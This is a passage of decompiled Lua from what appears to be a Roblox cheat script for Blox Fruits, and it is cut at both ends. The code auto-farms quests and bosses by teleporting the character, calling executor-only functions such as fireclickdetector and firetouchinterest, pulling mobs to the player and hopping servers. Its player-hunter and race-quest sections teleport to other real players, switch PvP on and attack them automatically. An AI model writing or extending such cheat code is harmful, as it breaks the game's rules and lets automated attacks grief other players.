                        if eltrulngungungu then
                            if game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible then
                                if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, eltrulngungungu.Name:gsub(" %pLv. %d+%p", "")) then
                                    repeat
                                        wait()
                                        pcall(function()
                                            to(getKillVector3(eltrulngungungu.HumanoidRootPart.CFrame))
                                            click = true
                                            stuff(eltrulngungungu)
                                        end)
                                    until not skidymf(eltrulngungungu)
                                    click = false
                                else
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                                end
                            else
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter")
                            end
                        end
                    end
                    if CheckSea(3) and Canvanderreq then
                        local vu743 = CheckBoss("Beautiful Pirate [Lv. 1950] [Boss]")
                        set("Farming " .. vu743.Name .. " [Canvander]")
                        repeat
                            wait()
                            pcall(function()
                                to(getKillVector3(vu743.HumanoidRootPart.CFrame))
                                click = true
                                stuff(vu743)
                            end)
                        until not skidymf(vu743)
                    end
                    if cls_4 then
                        set("Doing Bartilo Quest")
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") ~= 0 then
                            if BartiloProgress ~= 1 then
                                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 2 then
                                    set("Doing Bartilo Quest 3: (sugget this quest name plz)")
                                    if (CFrame.new(- 1837.46155, 44.2921753, 1656.1987, 0.999881566, - 1.03885048e-22, - 0.0153914848, 1.07805858e-22, 1, 2.53909284e-22, 0.0153914848, - 2.55538502e-22, 0.999881566).Position - game.Players.LocalPlayer.Character.Head.Position).magnitude <= 500 then
                                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1836, 11, 1714)
                                        wait(0.5)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1850.49329, 13.1789551, 1750.89685)
                                        wait(1)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1858.87305, 19.3777466, 1712.01807)
                                        wait(1)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1803.94324, 16.5789185, 1750.89685)
                                        wait(1)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1858.55835, 16.8604317, 1724.79541)
                                        wait(1)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1869.54224, 15.987854, 1681.00659)
                                        wait(1)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1800.0979, 16.4978027, 1684.52368)
                                        wait(1)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1819.26343, 14.795166, 1717.90625)
                                        wait(1)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1813.51843, 14.8604736, 1724.79541)
                                    else
                                        to(CFrame.new(- 1837.46155, 44.2921753, 1656.1987, 0.999881566, - 1.03885048e-22, - 0.0153914848, 1.07805858e-22, 1, 2.53909284e-22, 0.0153914848, - 2.55538502e-22, 0.999881566))
                                    end
                                end
                            else
                                set("Doing Bartilo Quest 2: Killing Jeremy [Boss]")
                                local vu744 = CheckBoss("Jeremy [Lv. 850] [Boss]")
                                if vu744 then
                                    repeat
                                        wait()
                                        pcall(function()
                                            to(getKillVector3(vu744.HumanoidRootPart.CFrame))
                                            stuff(vu744)
                                            click = true
                                        end)
                                    until not skidymf(vu744)
                                    click = false
                                end
                            end
                        elseif game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible ~= true then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                                "StartQuest",
                                "BartiloQuest",
                                1
                            }))
                        elseif string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan") and string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") then
                            set("Doing Bartilo Quest 1: Killing 50x Swan Pirate")
                            pcall(function()
                                to(getMobLoadPos("Swan Pirate") * CFrame.new(0, 50, 5))
                            end)
                            local v745, v746, v747 = pairs(getsortedmon())
                            while true do
                                local vu748
                                v747, vu748 = v745(v746, v747)
                                if v747 == nil then
                                    break
                                end
                                if vu748.Name == "Swan Pirate [Lv. 775]" then
                                    repeat
                                        wait()
                                        pcall(function()
                                            to(getKillVector3(vu748.HumanoidRootPart.CFrame))
                                            stuff(vu748)
                                            BringMobChoosen = vu748
                                            BringMob(vu748)
                                            click = true
                                        end)
                                    until not skidymf(vu748)
                                    click = false
                                end
                            end
                        else
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                        end
                    end
                    if CheckSea(3) and (CheckMaterialCount("Conjured Cocoa") < 10 and not (checkitem("Sweet Chalice") or checkitem("Mirror Fractal"))) then
                        set("Farmimg Until Conjured Cocoa Hit 10x [" .. CheckMaterialCount("Conjured Cocoa") .. "/10]")
                        local v749, v750, v751 = pairs({
                            "Chocolate Bar Battler [Lv. 2325]",
                            "Cocoa Warrior [Lv. 2300]"
                        })
                        while true do
                            local v752, vu753 = v749(v750, v751)
                            if v752 == nil then
                                break
                            end
                            v751 = v752
                            if getmon(vu753) then
                                local v754, v755, v756 = pairs(getsortedmon())
                                while true do
                                    local vu757
                                    v756, vu757 = v754(v755, v756)
                                    if v756 == nil then
                                        break
                                    end
                                    if vu757.Name == vu753 then
                                        click = true
                                        BringMob(vu757)
                                        repeat
                                            wait()
                                            pcall(function()
                                                to(getKillVector3(vu757.HumanoidRootPart.CFrame))
                                                stuff()
                                            end)
                                        until not skidymf(vu757)
                                    end
                                end
                            else
                                pcall(function()
                                    local v758 = vu753
                                    to(getMobLoadPos(v758:gsub(" %pLv. %d+%p", "")) * CFrame.new(0, 80, 0))
                                end)
                            end
                        end
                    end
                    if CheckSea(2) and factoryexists then
                        set("Feeding Factory")
                        local vu759 = getmon("Core") or CheckBoss("Core")
                        if vu759 then
                            repeat
                                wait()
                                pcall(function()
                                    to(vu759.HumanoidRootPart.CFrame)
                                    click = true
                                    stuff(vu759)
                                end)
                            until not skidymf(vu759)
                            factoryexists = false
                        end
                        storefruit()
                    end
                    if CheckSea(2) and rengokustat then
                        set("Using Hidden Key For Rengoku")
                        to(CFrame.new(6571.1201171875, 299.23028564453, - 6967.841796875))
                        EquipWeaponName("Hidden Key")
                    end
                    if CheckSea(2) and librarydoor then
                        set("Using Library Key For Phoeyu")
                        to(CFrame.new(6376.93164, 296.760071, - 6843.54932, - 0.906182051, - 1.26464874e-8, - 0.422887832, - 7.46116324e-9, 1, - 1.39169662e-8, 0.422887832, - 9.45606971e-9, - 0.906182051))
                    end
                    if CheckSea(2) and (not cls_7 and checkitem("Water Key")) then
                        set("Using Water Key For Daigrock")
                        buyMelee("SharkmanKarate")
                    end
                    if CheckSea(3) and (c().Process["Soul Guitar"] and not checkitem("Soul Guitar")) and (game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check") == nil and game:GetService("Lighting").Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149431") then
                        set("Soul Guitar Start Quest [Dialoguing Gravestone]")
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check") == nil then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("gravestoneEvent", 2, true)
                        end
                    end
                    if CheckSea(3) and c().Process["Soul Guitar"] and type(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")) == "table" then
                        local v760, v761, v762 = pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check"))
                        while true do
                            local v763
                            v762, v763 = v760(v761, v762)
                            if v762 == nil then
                                break
                            end
                            if v763 == false then
                                if v762 ~= "Swamp" then
                                    if v762 ~= "Gravestones" then
                                        if v762 ~= "Ghost" then
                                            if v762 == "Trophies" then
                                                set("Soul Guitar 5st Quest [Trophies1]")
                                                local v764, v765, v766 = pairs(game:GetService("Workspace").Map["Haunted Castle"].Tablet:GetChildren())
                                                while true do
                                                    local v767
                                                    v766, v767 = v764(v765, v766)
                                                    if v766 == nil then
                                                        break
                                                    end
                                                    if v767:FindFirstChild("ClickDetector") and v767.Line.p.Y < - 999 then
                                                        fireclickdetector(v767.ClickDetector)
                                                        task.wait(0.2)
                                                    end
                                                end
                                            end
                                        else
                                            set("Soul Guitar 4st Quest [Ghost]")
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost")
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost", true)
                                        end
                                    else
                                        set("Soul Guitar 3rd Quest [Gravestones]")
                                        _____temp = {
                                            Placard7 = "Left",
                                            Placard6 = "Left",
                                            Placard5 = "Left",
                                            Placard4 = "Right",
                                            Placard3 = "Left",
                                            Placard2 = "Right",
                                            Placard1 = "Right"
                                        }
                                        local v768, v769, v770 = pairs(_____temp)
                                        while true do
                                            local v771
                                            v770, v771 = v768(v769, v770)
                                            if v770 == nil then
                                                break
                                            end
                                            fireclickdetector(game:GetService("Workspace").Map["Haunted Castle"][v770][v771].ClickDetector)
                                            task.wait(0.2)
                                        end
                                    end
                                else
                                    set("Soul Guitar 2nd Quest [Swamp]")
                                    _a_a_a_c = {
                                        "Living Zombie [Lv. 2000]",
                                        "Living Zombie"
                                    }
                                    to(getMobLoadPos(_a_a_a_c[2]))
                                    local v772, v773, v774 = pairs(getsortedmon())
                                    while true do
                                        local v775
                                        v774, v775 = v772(v773, v774)
                                        if v774 == nil then
                                            break
                                        end
                                        if v775.Name == _a_a_a_c[1] then
                                            while skidymf(v775) do
                                                BringMob(v775)
                                                click = true
                                                to(v775.HumanoidRootPart.CFrame * CFrame.new(0, 35, 0))
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    if CheckSea(2) and rengokustat3 then
                        local v776 = CheckBoss("Awakened Ice Admiral [Lv. 1400] [Boss]")
                        set("Feeding Awakened Ice Admiral [Lv. 1400] [Rengoku/Phoeyu]")
                        wait()
                        print(0)
                        to(getKillVector3(v776.HumanoidRootPart.CFrame))
                        print(1)
                        click = true
                        stuff(v776)
                        if not skidymf(v776) then
                        end
                    end
                    if CheckSea(2) and waterkeystuff then
                        local v777 = CheckBoss("Tide Keeper [Lv. 1475] [Boss]")
                        set("Feeding " .. v777.Name .. " [Daigrock]")
                        repeat
                            wait()
                            warn(0)
                            to(getKillVector3(v777.HumanoidRootPart.CFrame))
                            click = true
                            stuff(v777)
                        until not skidymf(v777)
                        if not checkitem("Water Key") and getPlayerLevel() > 1500 then
                            noti("Hop For Water Key")
                            HopServer()
                            wait(9999)
                        end
                    end
                    if CheckSea(1) and (getPlayerLevel() > 200 and not checkitem("Saber")) and (game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide and c().Process.Saber) then
                        set("Doing Saber Quest")
                        if game:GetService("Workspace").Map.Jungle.QuestPlates.Door.CanCollide then
                            local v778 = next
                            local v779, v780 = game:GetService("Workspace").Map.Jungle.QuestPlates:GetChildren()
                            while true do
                                local vu781
                                v780, vu781 = v778(v779, v780)
                                if v780 == nil then
                                    break
                                end
                                if vu781:IsA("Model") and vu781.Button:FindFirstChild("TouchInterest") then
                                    pcall(function()
                                        wait(1)
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = vu781.Button.CFrame
                                    end)
                                end
                            end
                        end
                        if game:GetService("Workspace").Map.Desert.Burn.Part.Transparency == 0 then
                            if checkitem("Torch") then
                                repeat
                                    wait()
                                    EquipWeaponName("Torch")
                                    to(CFrame.new(1114.61475, 5.04679728, 4350.22803, - 0.648466587, - 1.28799094e-9, 0.761243105, - 5.70652914e-10, 1, 1.20584542e-9, - 0.761243105, 3.47544882e-10, - 0.648466587))
                                until not checkitem("Torch")
                            else
                                to(game:GetService("Workspace").Map.Jungle.Torch.CFrame)
                            end
                        end
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan") ~= 0 then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "GetCup")
                            EquipWeaponName("Cup")
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "FillCup", game:GetService("Players").LocalPlayer.Character.Cup)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "SickMan")
                        end
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == nil then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                        end
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 0 and not checkitem("Relic") then
                            while true do
                                wait()
                                local v782 = CheckBoss("Mob Leader [Lv. 120] [Boss]")
                                if v782 then
                                    repeat
                                        wait()
                                        to(v782.HumanoidRootPart.CFrame * CFrame.new(0, 35, 5))
                                        click = true
                                        stuff(v782)
                                    until not skidymf(v782)
                                    click = false
                                end
                                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") == 1 or checkitem("Relic") then
                                end
                            end
                        end
                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon") ~= 1 or not game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide then
                        end
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                        EquipWeaponName("Relic")
                        wait()
                        to(CFrame.new(- 1404.91504, 29.9773273, 3.80598116, 0.876514494, 5.66906877e-9, 0.481375456, 2.53851997e-8, 1, - 5.79995607e-8, - 0.481375456, 6.30572643e-8, 0.876514494))
                        if game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide and checkitem("Relic") then
                        end
                    end
                    if CheckSea(1) and (CheckBoss("Saber Expert [Lv. 200] [Boss]") and (getPlayerLevel() > 199 and not checkitem("Saber"))) and not game:GetService("Workspace").Map.Jungle.Final.Part.CanCollide then
                        local v783 = CheckBoss("Saber Expert [Lv. 200] [Boss]")
                        set("Feeding Saber Expert [Saber]")
                        if v783 then
                            repeat
                                wait()
                                to(getKillVector3(v783.HumanoidRootPart.CFrame))
                                stuff(v783)
                                click = true
                            until not skidymf(v783)
                            click = false
                        end
                    end
                    if CheckSea(1) and getPlayerLevel() > 725 and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") ~= 0 then
                        set("Doing Dressrosa Quest")
                        if not (checkitem("Saber") or CheckBoss("Saber Expert [Lv. 200] [Boss]")) then
                            set("Hop For Reason: Missing Saber, Hopping For Requirements")
                            HopServer()
                            wait(9999)
                            return
                        end
                        set("Doing 2nd Sea Quest")
                        if game.Workspace.Map.Ice.Door.CanCollide then
                            if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Key") then
                                EquipWeaponName("Key")
                                if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key") then
                                    to(game.Workspace.Map.Ice.Door.CFrame)
                                end
                            elseif (CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).magnitude >= 5 then
                                to(CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359), false)
                            else
                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Detective")
                                EquipWeaponName("Key")
                            end
                        else
                            local v784 = not game.Workspace.Map.Ice.Door.CanCollide and CheckBoss("Ice Admiral [Lv. 700] [Boss]")
                            if v784 then
                                repeat
                                    wait()
                                    to(getKillVector3(v784.HumanoidRootPart.CFrame))
                                    stuff(v784)
                                    click = true
                                until not skidymf(v784)
                                click = false
                                repeat
                                    wait()
                                until not TeleportSea(2)
                            end
                        end
                    end
                    if CheckSea(1) and (getPlayerLevel() < 725 and getPlayerLevel() > 60) and (game.ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter") ~= "I don\'t have anything for you right now. Come back later." and c().Process["Hunter Quest"]) then
                        if not dimemi then
                            grhsksjehjrjdjdjsks = os.time()
                        end
                        dimemi = true
                        set("Doing Player Hunter Quest")
                        st = 1
                        if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter") ~= "I don\'t have anything for you right now. Come back later." and game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible then
                            local v785 = string.gsub(string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Defeat ", ""), " %p(0/1)%p", "")
                            dicac = game.Players[v785]
                            if dicac and not vu686[dicac.Name] then
                                if dicac:FindFirstChild("Data") and (dicac.Data.Level.Value > 20 and dicac.Character.Humanoid.MaxHealth < game.Players.LocalPlayer.Character.Humanoid.Health + getPlayerLevel() * 1.4 * 2) then
                                    dimemi = false
                                    set("Skip Level: " .. dicac.Name)
                                    starttime = os.time()
                                    iseltrulcool = false
                                    repeat
                                        game:GetService("RunService").Stepped:Wait()
                                        pcall(function()
                                            dmlockskill = dicac.Character.Head.Position
                                            stuff()
                                            if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible then
                                                repeat
                                                    wait(1)
                                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")
                                                    starttime = starttime + 1
                                                until not game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible or starttime > 50
                                            end
                                            to(dicac.Character.HumanoidRootPart.CFrame + (alskdbwbhsh or Vector3.new(0, 0, 0)))
                                            spawn(function()
                                                if vu685:DistanceFromCharacter(dicac.Character.HumanoidRootPart.Position) >= 10 then
                                                    if not iseltrulcool then
                                                        starttime = os.time()
                                                    end
                                                else
                                                    iseltrulcool = true
                                                    down("Z")
                                                    down("X")
                                                end
                                            end)
                                        end)
                                    until not dicac.Character:FindFirstChild("Head") or os.time() - starttime > 30 or (not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible or game.Players.LocalPlayer.PlayerGui.Main.SafeZone.Visible)
                                    dmlockskill = false
                                    vu686[dicac.Name] = true
                                else
                                    vu686[dicac.Name .. tostring(math.random(83848, 2.7277282727278484e16))] = true
                                end
                            end
                        end
                        if dimemi and os.time() - grhsksjehjrjdjdjsks > 3 then
                            HopServer()
                            return
                        end
                    end
                    if CheckSea(2) and (c().Process["V3 Race"] and (getPlayerBeli() > 2000000 and (not moctui(3) and (table.find(backi, whatismyrace()) and (whatismyrace() == "Human" and (not pork or throughcheck(pork, 0, CheckBoss))))))) and uable.FlamingoAccess then
                        set("Doing V3 Race Quest ")
                        local v786 = whatismyrace()
                        sh()
                        if v786 ~= "Human" then
                            if v786 ~= "Angel" then
                                if v786 == "Rabbit" then
                                    local v787, v788, v789 = pairs(game.Workspace:GetChildren())
                                    while true do
                                        local vu790
                                        v789, vu790 = v787(v788, v789)
                                        if v789 == nil then
                                            break
                                        end
                                        pcall(function()
                                            to(vu790.CFrame)
                                        end)
                                        sh()
                                        if moctui(3) then
                                            break
                                        end
                                    end
                                end
                            else
                                sh()
                                local v791 = luoiquanenskidxdxdxd()
                                if not v791 or # v791 < 1 then
                                    HopServer()
                                end
                                local v792, v793, v794 = pairs(v791)
                                while true do
                                    local vu795
                                    v794, vu795 = v792(v793, v794)
                                    if v794 == nil then
                                        break
                                    end
                                    repeat
                                        game:GetService("RunService").Stepped:Wait()
                                        local v796, v797 = pcall(function()
                                            dmlockskill = vu795.Character.Head.Position
                                            stuff()
                                            if game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible then
                                                repeat
                                                    wait()
                                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EnablePvp")
                                                    starttime = starttime + 1
                                                until not game.Players.LocalPlayer.PlayerGui.Main.PvpDisabled.Visible
                                            end
                                            to(vu795.Character.HumanoidRootPart.CFrame + (alskdbwbhsh or Vector3.new(0, 0, 0)))
                                            if game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].Z.Cooldown.AbsoluteSize.X <= 5 then
                                                alskdbwbhsh = Vector3.new(0, 0, 0)
                                                repeat
                                                    wait()
                                                until not game.Players.LocalPlayer.Character.Busy.Value
                                                wait(0.1)
                                            else
                                                alskdbwbhsh = Vector3.new(0, 40, 0)
                                            end
                                            if game.Players.LocalPlayer.PlayerGui.Main.Skills[NameMelee()].X.Cooldown.AbsoluteSize.X <= 5 then
                                                alskdbwbhsh = Vector3.new(0, 0, 0)
                                                repeat
                                                    wait()
                                                until not game.Players.LocalPlayer.Character.Busy.Value
                                                wait(0.1)
                                            else
                                                alskdbwbhsh = Vector3.new(0, 40, 0)
                                            end
                                            if vu685:DistanceFromCharacter(vu795.Character.HumanoidRootPart.Position) >= 10 then
                                                if not hirimiihubontopxd then
                                                    starttime = os.time()
                                                end
                                            else
                                                hirimiihubontopxd = true
                                                down("Z")
                                                down("X")
                                            end
                                        end)
                                        eieiksghrjdks = v797
                                        jrjdbdhdjks = v796
                                    until not (vu795 and vu795.Character) or (not vu795.Character:FindFirstChild("Humanoid") or (not vu795.Character:FindFirstChild("Head") or (not skidymf(vu795.Character) or (os.time() - starttime > 150 or (game.Players.LocalPlayer.PlayerGui.Main.SafeZone.Visible or (checkNotify("player") or moctui(3)))))))
                                    dmlockskill = false
                                end
                            end
                        else
                            pork = {
                                ["Fajita [Lv. 925] [Boss]"] = false,
                                ["Jeremy [Lv. 850] [Boss]"] = false,
                                ["Diamond [Lv. 750] [Boss]"] = false
                            }
                            local v798, v799, v800 = pairs(pork)
                            while true do
                                local v801, v802 = v798(v799, v800)
                                if v801 == nil then
                                    break
                                end
                                v800 = v801
                                if v802 ~= false or not CheckBoss(v801) then
                                    noti("Waiting For Boss: " .. tostring(v801))
                                else
                                    inside = CheckBoss(v801)
                                    repeat
                                        task.wait()
                                        to(getKillVector3(inside.HumanoidRootPart.CFrame))
                                        stuff(inside)
                                        click = true
                                    until not skidymf(inside)
                                    click = false
                                    pork[v801] = true
                                    UpV3()
                                end
                            end
                        end
                        if dimemi and os.time() - grhsksjehjrjdjdjsks > 3 then
                            HopServer()
                            return
                        end
                    end
                    if fruitspawn() and (c().Fruit["Auto Loot Spawn Fruit"] and not CheckIsRaiding()) then
                        set("SpawnFruit Tweening")
                        fw = fruitspawn()
                        game.Players.LocalPlayer.Character.Humanoid:MoveTo(fw.Handle.CFrame.p)
                        to(fw.Handle.CFrame)
                    end
                    if CheckSea(2) and (getPlayerLevel() > 1500 and (uable.FlamingoAccess == nil and (get1mfruit() == false and (not AutoRaid and (not CheckIsRaiding() and (c().Process["Hop For Swan Quest"] and os.time() - timelol > c().Process["Delay On Server While Swan Hop"])))))) then
                        set("Hopping For Reason: Missing 1M+ Fruit, Hop")
                        wait(2)
                        if AutoRaid and not CheckIsRaiding() then
                            HopServer()
                            wait(9999)
                        end
                        HopServer()
                        wait(9999)
                    end
                    if CheckSea(2) and (getPlayerLevel() > 1100 and (not uable.FlamingoAccess and get1mfruit())) then
                        set("Give 1M+ Devil Fruit For Trevor [Swan Quests]")
                        loadfruit(get1mfruit())
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor", "1")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor", "2")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor", "3")
                    end
                    if CheckSea(2) and (getPlayerLevel() > 1100 and (uable.FlamingoAccess and (CheckBoss("Don Swan [Lv. 1000] [Boss]") and zqp == nil))) then
                        local v803 = CheckBoss("Don Swan [Lv. 1000] [Boss]")
                        set("Feeding " .. v803.Name .. " [Swan Quests]")
                        if v803 then
                            repeat
                                wait()
                                to(getKillVector3(v803.HumanoidRootPart.CFrame))
                                click = true
                                stuff()
                            until not (skidymf(v803) and (CheckIsRaiding() and AutoRaid))
                            click = false
                        end
                    end
                    if CheckSea(2) and (getPlayerLevel() > 1500 and (zqp == 0 and cls_7)) then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ZQuestProgress", "Check")
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ZQuestProgress", "Begin")
                        v53 = CheckBoss("rip_indra [Lv. 1500] [Boss]")
                        set("Feeding " .. v53.Name .. " [3rd Sea]")
                        if v53 then
                            repeat
                                wait()
                                to(getKillVector3(v53.HumanoidRootPart.CFrame))
                                click = true
                                stuff()
                            until not skidymf(v53)
                            click = false
                        end
                    end
                    if CheckSea(1) and getPlayerLevel() <= 60 then
                        st = 2
                        Mob = "Shanda"
                        Mob2 = "Shanda [Lv. 475]"
                        pcall(function()
                            to(getMobLoadPos(Mob) + Vector3.new(0, 50, 0))
                        end)
                        local v804, v805, v806 = pairs(getsortedmon())
                        while true do
                            local v807
                            v806, v807 = v804(v805, v806)
                            if v806 == nil then
                                break
                            end
                            if v807.Name == Mob2 then
                                stuff(v807)
                                repeat
                                    wait()
                                    BringMob(v807)
                                    to(getKillVector3(v807.HumanoidRootPart.CFrame))
                                    click = true
                                until not skidymf(v807) or st ~= 2
                                click = false
                                click = false
                            end
                        end
                    end
                    if CheckSea(2) and (BartiloProgress == 3 and (c().Process["V2 Race"] and (getPlayerBeli() > 700000 and not moctui(2)))) and ((game.Workspace:FindFirstChild("Flower1") and workspace.Flower1.Transparency ~= 1 or checkitem("Flower 1")) and not checkitem("Flower 3")) then
                        set("Auto Doing Evolution Quest [Race V2]")
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "2")
                        pcall(function()
                            if checkitem("Flower 1") then
                                if cls_6 then
                                    pcall(function()
                                        to(Workspace.Flower2.CFrame)
                                    end)
                                elseif not checkitem("Flower 3") then
                                    pcall(function()
                                        to(getMobLoadPos("Swan Pirate") * CFrame.new(math.random(0, 50), math.random(0, 80), math.random(0, 50)))
                                    end)
                                    local v808, v809, v810 = pairs(getsortedmon())
                                    while true do
                                        local v811
                                        v810, v811 = v808(v809, v810)
                                        if v810 == nil then
                                            break
                                        end
                                        if v811 and v811.Name == "Swan Pirate [Lv. 775]" then
                                            repeat
                                                wait()
                                                to(getKillVector3(v811.HumanoidRootPart.CFrame))
                                                click = true
                                                stuff(v811)
                                                BringMobChoosen = v811
                                                BringMob(v811)
                                            until not skidymf(v811) or checkitem("Flower 3")
                                            click = false
                                            wait(0.3)
                                        end
                                    end
                                end
                            else
                                to(Workspace.Flower1.CFrame)
                            end
                        end)
                    end
                    if getBossCanKill()[4] then
                        local v812 = getBossCanKill()
                        set("Feeding " .. v812[1].Name .. " [Questable Boss]")
                        if v812 and (v812[4] and (v812[1] and v812[4])) then
                            if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible then
                                if string.find(v812[1].Name, game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text:gsub("%s*Defeat%s*(%d*)%s*(.-)%s*%b()", "%2")) then
                                    repeat
                                        wait()
                                        stuff(v812[1])
                                        click = true
                                        to(getKillVector3(v812[1].HumanoidRootPart.CFrame))
                                    until not skidymf(v812[1])
                                    click = false
                                else
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                                end
                            else
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest", tostring(v812[2].QuestName), v812[2].QuestId)
                            end
                        end
                    end
                    if eltrul.Superhuman <= 399 or (eltrul["Death Step"] <= 399 or (eltrul["Electric Claw"] <= 399 or (eltrul["Dragon Talon"] <= 399 or (eltrul["Sharkman Karate"] <= 399 or checkMelee("Godhuman"))))) or game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman") ~= "You seem strong. Bring me 20 Fish Tails, 20 Magma Ore, 10 Dragon Scales and 10 Mystic Droplets." then
                        if c().ChestFarm and gnc() then
                            set("Auto Chest")
                            local vu813 = gnc()
                            to(vu813.CFrame)
                            pcall(function()
                                if game.Players.LocalPlayer:DistanceFromCharacter(vu813.Position) < 10 then
                                    firetouchinterest(vu813, game.Players.LocalPlayer.Character.PrimaryPart, 0)
                                    firetouchinterest(vu813, game.Players.LocalPlayer.Character.PrimaryPart, 1)
                                end
                            end)
                        elseif CheckSea(3) and (checkitem("God\'s Chalice") and CheckMaterialCount("Conjured Cocoa") > 9 or (getPlayerLevel() > 2449 and (c().Process["Auto Katakuri While Maxed"].Enable and getPlayerFragments() < c().Process["Auto Katakuri While Maxed"].Until) or checkitem("Sweet Chalice"))) then
                            set("Auto Farm Katakuri After Max")
                            if c().Process["Auto Hop"].Enable and (os.time() - script_time > c().Process["Auto Hop"].Delay and not checkitem("Sweet Chalice")) then
                                HopServer()
                                return
                            end
                            spawn(function()
                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("SweetChaliceNpc")
                                EquipWeaponName("Sweet Chalice")
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner")
                            end)
                            isloaded2 = false
                            local v814, v815, v816 = pairs(getsortedmon())
                            while true do
                                local v817
                                v816, v817 = v814(v815, v816)
                                if v816 == nil then
                                    break
                                end
